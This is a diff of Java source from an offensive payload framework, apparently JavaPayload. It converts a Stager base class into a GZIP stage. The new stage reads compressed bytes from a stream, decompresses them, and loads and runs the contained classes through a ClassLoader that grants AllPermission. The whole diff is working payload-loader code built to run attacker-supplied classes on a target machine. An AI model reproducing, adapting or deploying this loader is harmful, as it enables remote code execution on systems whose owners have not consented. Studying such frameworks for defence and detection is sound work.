@@ -32,28 +32,39 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.stage;
 
+import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
+import java.io.SequenceInputStream;
 import java.net.URL;
 import java.security.AllPermission;
 import java.security.CodeSource;
 import java.security.Permissions;
 import java.security.ProtectionDomain;
 import java.security.cert.Certificate;
+import java.util.zip.GZIPInputStream;
 
-public abstract class Stager extends ClassLoader {
+public class GZIP extends ClassLoader implements Stage {
 
-	public Stager targetStager = null;
-	
-	protected void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) throws Exception {
-		if (targetStager != null) {
-			targetStager.bootstrap(rawIn, out, parameters);
-			return;
+	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+		byte[] compressed = new byte[in.readInt()];
+		in.readFully(compressed);
+		String[] newParams = (String[])parameters.clone();		
+		for (int i = 0; i < parameters.length; i++) {
+			if (parameters[i].equals("--")) {
+				newParams[i] = "";
+				newParams[i+1] = "--";
+				bootstrap(new SequenceInputStream(new GZIPInputStream(new ByteArrayInputStream(compressed)), in), out, newParams);
+				break;
+			}
 		}
+	}
+	
+	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
@@ -73,9 +84,7 @@ public abstract class Stager extends ClassLoader {
 			final Object stage = clazz.newInstance();
 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
 		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out));
+			t.printStackTrace(new PrintStream(out, true));
 		}
 	}
-
-	public abstract void bootstrap(String[] parameters) throws Exception;
 }
